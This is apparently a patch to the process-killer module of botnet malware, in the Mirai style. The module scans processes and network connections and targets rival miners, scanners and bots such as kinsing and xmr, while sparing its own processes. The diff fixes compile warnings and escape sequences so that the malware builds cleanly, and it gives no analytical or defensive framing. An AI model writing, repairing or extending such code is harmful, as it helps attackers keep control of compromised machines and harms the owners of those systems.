@@ -11,6 +11,7 @@
 #include <dirent.h>
 #include <unistd.h>
 #include <time.h>
+#include <sys/prctl.h>  // Added for prctl
 
 #include "killer.h"
 #include "config.h"
@@ -34,11 +35,11 @@ const char *blacklisted_patterns[] = {
     "/boot", "/home", "/media", "/mnt",
     "xig", "xmr", "monero", "crypto", "miner",
     "ddgs", "pnscan", "masscan", "zmap", "nmap",
-    "\.bash", "\.ssh", "\.config",
+    ".bash", ".ssh", ".config",  // Fixed: removed invalid escape sequences
     "kworker", "kthrotld", "ksoftirqd",
     "watchdog", "migration", "rcu_sched",
     "softbot", "bot", "malware", "virus",
-    "\.arm", "\.mips", "\.ppc", "\.x86",
+    ".arm", ".mips", ".ppc", ".x86",  // Fixed: removed invalid escape sequences
     "(deleted)", "unreachable", "kdevtmpfs",
     "kinsing", "kthreadd", "kworker", "kswapd"
 };
@@ -51,6 +52,8 @@ const int whitelisted_ports[] = {
 };
 
 int is_whitelisted(pid_t pid, const char *cmdline, const char *exe, const char *maps) {
+    (void)maps; // Silence unused parameter warning
+    
     // Whitelist our own processes
     if (pid == main_pid || pid == watcher_pid || pid == getpid() || pid == getppid())
         return 1;
@@ -265,7 +268,7 @@ void killer_ps(void) {
         fclose(fp);
         if (!n) continue;
 
-        for (int i = 0; i < n; i++) {
+        for (size_t i = 0; i < n; i++) {  // Fixed: changed int to size_t
             if (cmdline[i] == '\0') cmdline[i] = ' ';
         }
 
@@ -353,7 +356,7 @@ void killer_tcp(void) {
             fread(cmdline, 1, sizeof(cmdline)-1, cmd_fp);
             fclose(cmd_fp);
 
-            for (int i = 0; i < sizeof(cmdline); i++) {
+            for (size_t i = 0; i < sizeof(cmdline); i++) {  // Fixed: changed int to size_t
                 if (cmdline[i] == '\0') cmdline[i] = ' ';
             }
 
@@ -406,7 +409,7 @@ void killer_udp(void) {
             fread(cmdline, 1, sizeof(cmdline)-1, cmd_fp);
             fclose(cmd_fp);
 
-            for (int i = 0; i < sizeof(cmdline); i++) {
+            for (size_t i = 0; i < sizeof(cmdline); i++) {  // Fixed: changed int to size_t
                 if (cmdline[i] == '\0') cmdline[i] = ' ';
             }
 
